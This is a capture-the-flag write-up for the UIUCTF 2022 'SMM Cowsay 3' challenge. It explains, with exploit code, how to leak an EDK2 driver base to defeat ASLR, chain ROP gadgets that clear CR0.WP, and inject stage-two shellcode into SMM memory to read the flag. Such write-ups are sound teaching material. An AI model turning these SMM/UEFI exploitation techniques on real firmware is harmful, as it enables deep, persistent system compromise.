# SMM Cowsay 3

**Author**: [@mebeim](https://twitter.com/mebeim) - **Full exploit**:
[expl_smm_cowasy_3.py][expl3]

**NOTE**: introductory info can be found in [the writeup for SMM Cowsay
1](https://ctftime.org/writeup/34881) and in [the one for for SMM Cowsay
2](https://ctftime.org/writeup/34882).

> We fired that engineer. Unfortunately, other engineers refused to touch this  
> code, but instead suggested to integrate some ASLR code found online.  
> Additionally, we hardened the system with SMM_CODE_CHK_EN and kept DEP on.
> Now  
> that we have the monster combination of ASLR+DEP, we should surely be
> secure,  
> right?

Things get a bit more complicated now, but honestly not that much. The code
for  
`SmmCowsay.efi` is unchanged, so the vulnerability is still the same, but the  
EDK2 and QEMU patches now apply two major modifications:

1. `SMM_CODE_CHK_EN` has been enabled: this is a bit in the  
  `MSR_SMM_FEATURE_CONTROL` MSR, which controls whether SMM can execute code  
  outside of the ranges defined by two other MSRs: `IA32_SMRR_PHYSBASE` and  
  `IA32_SMRR_PHYSMASK` (basically outside SMRAM). The "Lock" bit of  
  `MSR_SMM_FEATURE_CONTROL` is also set in QEMU when setting
`SMM_CODE_CHK_EN`,  
  so this check cannot be disabled.

  This isn't really a problem since we weren't really executing any code  
  outside SMRAM. We can already get what we want with a simple ROP chain that  
  utilizes code already present in SMRAM, assuming we find the right gadgets.

2. ASLR has been added to EDK2 (original patches from  
  [jyao1/SecurityEx][gh-edk2-securityex] with some slight changes): now every  
  single driver is loaded at a different address that changes each boot, with  
  10 bits of entropy taken using [the `rdrand` instruction][x86-rdrand].  
  Needless to say, this makes using hardcoded addresses like we did for the  
  previous exploit impossible.

## Exploitation

### Defeating ASLR

How do we leak some SMM address in order to defeat ASLR? Well, there are a
bunch  
of protocols registered by EDK2 drivers. Each protocol has its own GUID, and  
calling `BootServices->LocateProtocol` with a valid GUID will return a pointer  
to the protocol struct (if present), *which resides in the driver implementing  
the protocol!* This allows us to leak the base address (after a simple  
subtraction) of any driver implementing a protocol that is registered at the  
time of the execution of our code.

If we take a look at [the file `MdePkg/MdePkg.dec`][edk2-MdePkg] in the EDK2  
source code we have a bunch of GUIDs for different protocols. Without even  
wasting time inspecting other parts of the source code, we can dump them all
and  
try requesting every single one of them, until we find an address that looks  
interesting.

Again, patching the `run.sh` script to let QEMU dump EDK2 debug output to a
file  
like we did for SMM Cowsay 2, we can find SMBASE, which I assumed as the start  
address of SMRAM when writing the exploit. *In theory, SMRAM can expand before  
and after SMBASE, which according to Intel Doc just marks the base address
used  
to find the entry point for the SMI handler and the save state area.*

```  
CPU[000]  APIC ID=0000  SMBASE=07FAF000  SaveState=07FBEC00  Size=00000400  
```

Now, using the same code we used for both the previous challenges, we can
check  
every single protocol GUID listed in `MdePkg/MdePkg.dec` and see if the
address  
returned is after SMBASE:

```python  
with open('debug.log') as f:  
   for line in f:  
       if line.startswith('CPU[000]  APIC ID=0000  SMBASE='):  
           smbase = int(line[31:31 + 8], 16)

# Manually or programmatically extract GUIDs from MdePkg/MdePkg.dec

for guid in guids:  
   code = asm(f'''  
       /* LocateProtocol(&guid, NULL, &protocol) */  
       lea rcx, qword ptr [rip + guid]  
       xor rdx, rdx  
       lea r8, qword ptr [rip + protocol]  
       mov rax, {LocateProtocol}  
       call rax

       test rax, rax  
       jnz fail

       mov rax, qword ptr [rip + protocol]  
       ret

   fail:  
       ud2

   guid:  
       .octa {guid}  
   protocol:  
   ''')  
   conn.sendline(code.hex().encode() + b'\ndone')

   conn.recvuntil(b'RAX: 0x')  
   proto = int(conn.recvn(16), 16)

   if proto > smbase:  
log.info('Interesting protocol: GUID = 0x%x, ADDR = 0x%x', guid, proto)  
```

Surely enough, by letting the script run for enough time, we find that  
`gEfiSmmConfigurationProtocolGuid` returns a pointer to a protocol at a nice  
address. Looking at the `debug.log` for loaded drivers we can see that this  
address is inside the `PiSmmCpuDxeSmm.efi` SMM driver, and a simple
subtraction  
gives us its base address.

### Finding ROP gadgets

Now we can take a look at the gadgets in `PiSmmCpuDxeSmm.efi`. As it turns
out,  
we were lucky enough:

- Looking from GDB, we still have R13, R14 and R15 spilled on the SMI stack at  
 the exact same offset.  
- We can move the stack pointer forward: `ret 0x6d`  
- We can flip the stack: `pop rsp; ret`  
- We can pop RAX and other registers: `pop rax ; pop rbx ; pop r12 ; ret`  
- We can set CR0: `mov cr0, rax ; wbinvd ; ret`  
- We have a write-what-where primitive: `mov qword ptr [rbx], rax ; pop rbx ; ret`

We do not have a lot more nice gadgets to work with, so this time instead of  
writing the entire exploit using ROP, after disabling CR0.WP, we will just use  
the write-what-where gadget to overwrite a piece of `.text` of  
`PiSmmCpuDxeSmm.efi` with a stage 2 shellcode, and then simply jump to it.

The only slightly annoying part is the `ret 0x6d` gadget to move the stack  
forward: it will result in a misaligned stack, landing in the 2 most
significant  
bytes of the R13 value spilled on the stack. This isn't a real problem as  
thankfully the CPU (or better, QEMU) does not seem to care about the unaligned  
stack pointer. We'll simply have to do some bit shifting to put values on the  
stack nicely using R{13,14,15}.

```python  
# SmmConfigurationProtocol leaked using
LocateProtocol(gEfiSmmConfigurationProtocolGuid)  
PiSmmCpuDxeSmm_base = SmmConfigurationProtocol - 0x16210  
PiSmmCpuDxeSmm_text = PiSmmCpuDxeSmm_base + 0x1000

log.success('SmmConfigurationProtocol    @ 0x%x', SmmConfigurationProtocol)  
log.success('=> PiSmmCpuDxeSmm.efi       @ 0x%x', PiSmmCpuDxeSmm_base)  
log.success('=> PiSmmCpuDxeSmm.efi .text @ 0x%x', PiSmmCpuDxeSmm_text)

new_smm_stack   = buffer + 0x800  
ret_0x6d        = PiSmmCpuDxeSmm_base + 0xfc8a  # ret 0x6d  
flip_stack      = PiSmmCpuDxeSmm_base + 0x3c1c  # pop rsp ; ret  
pop_rax_rbx_r12 = PiSmmCpuDxeSmm_base + 0xd228  # pop rax ; pop rbx ; pop r12
; ret  
mov_cr0_rax     = PiSmmCpuDxeSmm_base + 0x10a7d # mov cr0, rax ; wbinvd ; ret  
write_primitive = PiSmmCpuDxeSmm_base + 0x3b8f  # mov qword ptr [rbx], rax ;
pop rbx ; ret

payload  = 'A'.encode('utf-16-le') * 200 + p64(ret_0x6d)  
```

### Second stage shellcode

As we just said we will make our ROP chain with a few gadgets that will write
a  
second stage shellcode into the `.text` of `PiSmmCpuDxeSmm.efi` and then jump
to  
it. This shellcode will have to walk the page table (this time we cannot  
pre-compute the address of the PTE because of ASLR), set the present bit on
the  
PTE and then read the flag into (one or more) registers.

```python  
stage2_shellcode = asm(f'''  
   movabs rbx, 0xffffffff000

   /* Walk page table */  
   mov rax, cr3  
   mov rax, qword ptr [rax]  
   and rax, rbx  
   mov rax, qword ptr [rax + 8 * 0x1]  
   and rax, rbx  
   mov rax, qword ptr [rax + 8 * 0x22]  
   and rax, rbx  
   mov rbx, rax  
   mov rax, qword ptr [rax + 8 * 0x40]

   /* Set present bit */  
   or al, 1  
   mov qword ptr [rbx + 8 * 0x40], rax

   /* Read flag and die so regs get dumped, GG! */  
   movabs rax, 0x44440000  
   mov rax, qword ptr [rax]  
   ud2  
''')  
```

Again, we can run the exploit multiple times changing that `0x44440000` to
leak  
8 bytes at a time and obtain the full flag.

### Putting it all together

Now we can build the ROP chain and send the exploit in the same way we did for  
SMM Cowsay 2:

```python  
real_chain = [  
   # Unset CR0.WP  
   pop_rax_rbx_r12, # pop rax ; pop rbx ; pop r12 ; ret  
   0x80000033     , # -> RAX  
   0xdeadbeef     , # filler  
   0xdeadbeef     , # filler  
   mov_cr0_rax    , # mov cr0, rax ; wbinvd ; ret  
]

# Now that CR0.WP is unset, we can just patch SMM code and jump to it!  
# Make the ROP chain write the stage 2 shellcode at PiSmmCpuDxeSmm_text  
# 8 bytes at a time, then jump into it  
for i in range(0, len(stage2_shellcode), 8):  
   chunk = stage2_shellcode[i:i + 8].ljust(8, b'\x90')  
   chunk = u64(chunk)

   real_chain += [  
       pop_rax_rbx_r12        , # pop rax ; pop rbx ; pop r12 ; ret  
       chunk                  , # -> RAX  
       PiSmmCpuDxeSmm_text + i, # -> RBX  
       0xdeadbeef             ,  
       write_primitive        , # mov qword ptr [rbx], rax ; pop rbx ; ret  
       0xdeadbeef  
   ]

real_chain += [PiSmmCpuDxeSmm_text]

# Transform real ROP chain into .quad directives to embed in the shellcode:  
#   .quad 0x7f8a184  
#   .quad 0x80000033  
#    ...  
real_chain_size = len(real_chain) * 8  
real_chain      = '.quad ' + '\n.quad '.join(map(str, real_chain))  
```

The asm of the code we send to the server is the same as for the previous  
challenge, so I am leaving most of it out. The only thing that changes is that  
we now have to do some math to put the gadget to flip the stack and the new  
stack address in the right place since the `ret 0x6d` will misalign the stack:

```python  
code = asm(f'''  
   /* ... */

   movabs r13, {(flip_stack << 40) & 0xffffffffffffffff}  
   movabs r14, {((flip_stack >> 24) | (new_smm_stack << 40)) & 0xffffffffffffffff}  
   movabs r15, {new_smm_stack >> 24}  
   call rax

   /* ... */  
''')  
```

Now just run the exploit in a loop as we did for SMM Cowsay 2 and leak the  
entire flag: `uiuctf{uefi_is_hard_and_vendors_dont_care_1403c057}`. GG!

---

GG to you too if you made it this far :O. All in all, this was very fun and  
interesting set of challenges that made me learn a lot about x86 SMM and UEFI.  
Hope you enjoyed the write-up.

[smm1]: #smm-cowsay-1  
[smm2]: #smm-cowsay-2  
[smm3]: #smm-cowsay-3  
[expl1]:
https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-
cowsay/expl_smm_cowasy_1.py  
[expl2]:
https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-
cowsay/expl_smm_cowasy_2.py  
[expl3]:
https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-
cowsay/expl_smm_cowasy_3.py

[tweet]:
https://twitter.com/MeBeiM/status/1554849894237609985  
[uiuctf]:                              https://ctftime.org/event/1600/  
[uiuctf-archive]:                      https://2022.uiuc.tf/challenges  
[author]:                              https://github.com/zhuyifei1999  
[wiki-smm]:
https://en.wikipedia.org/wiki/System_Management_Mode  
[intel-sdm]:
https://www.intel.com/content/www/us/en/developer/articles/technical/intel-
sdm.html  
[uefi-spec]:                           https://uefi.org/specifications  
[uefi-spec-pdf]:
https://uefi.org/sites/default/files/resources/UEFI_Spec_2_9_2021_03_18.pdf  
[man-cowsay]:                          https://manned.org/cowsay.1  
[man-pahole]:                          https://manned.org/pahole.1  
[x64-call]:                            https://docs.microsoft.com/en-
us/cpp/build/x64-calling-convention?view=msvc-170  
[x86-rsm]:                             https://www.felixcloutier.com/x86/rsm  
[x86-rdrand]:
https://www.felixcloutier.com/x86/rdrand  
[gh-pwntools]:                         https://github.com/Gallopsled/pwntools  
[gh-ropgadget]:
https://github.com/JonathanSalwan/ROPgadget  
[gh-edk2]:                             https://github.com/tianocore/edk2  
[gh-edk2-securityex]:                  https://github.com/jyao1/SecurityEx  
[gh-qemu]:                             https://github.com/qemu/qemu  
[qemu-memtxattrs]:
https://github.com/qemu/qemu/blob/v7.0.0/include/exec/memattrs.h#L35  
[edk2-SystemTable]:                    https://edk2-docs.gitbook.io/edk-ii-
uefi-driver-writer-s-guide/3_foundation/33_uefi_system_table  
[edk2-SmiHandlerRegister]:
https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdeModulePkg/Core/PiSmmCore/Smi.c#L213  
[edk2-EfiRuntimeServicesData]:
https://github.com/tianocore/edk2/blob/0ecdcb6142037dd1cdd08660a2349960bcf0270a/BaseTools/Source/C/Include/Common/UefiMultiPhase.h#L25  
[edk2-SmmCommunicationCommunicate]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L110  
[edk2-EFI_SMM_COMMUNICATION_PROTOCOL]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L267  
[edk2-copy-msg]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L547  
[edk2-smi-entry]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiEntry.nasm#L89  
[edk2-gadget]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/Library/BaseLib/X64/LongJump.nasm#L54  
[edk2-MdePkg]:
https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec  
[edk2-buffer-check]:
https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdePkg/Library/SmmMemLib/SmmMemLib.c#L163  
[edk2-gdt]:
https://github.com/tianocore/edk2/blob/2812668bfc121ee792cf3302195176ef4a2ad0bc/UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiException.nasm#L31

Original writeup
(https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/).